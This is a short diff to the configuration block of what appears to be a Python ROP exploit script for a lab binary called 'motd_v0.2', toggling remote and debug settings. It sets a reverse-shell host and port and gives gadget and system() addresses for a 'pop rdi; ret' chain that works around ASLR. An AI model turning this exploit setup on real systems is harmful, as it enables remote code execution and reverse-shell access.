@@ -49,11 +49,13 @@ Explanation:
         | ...           |
 """
 
-# REMOTE = ('127.0.0.1', 3002)
+REMOTE = ('127.0.0.1', 3002)
+REMOTE = None
+
 TARGET = '../bin/motd_v0.2' # Binary path (local)
 LHOST  = "10.0.0.105"       # Reverse shell host
 LPORT  = "8888"             # Reverse shell port
-DEBUG  = True               # Follow along in GDB
+DEBUG  = False               # Follow along in GDB
 
 PIVOT  = 0x4017b3 # ROPGadget.py --binary motd_v0.2 | grep 'pop rdi' # pop rdi; ret
 SYSTEM = 0x401652 # main jumps to system for us => Doesn't matter if libc is ASLR.
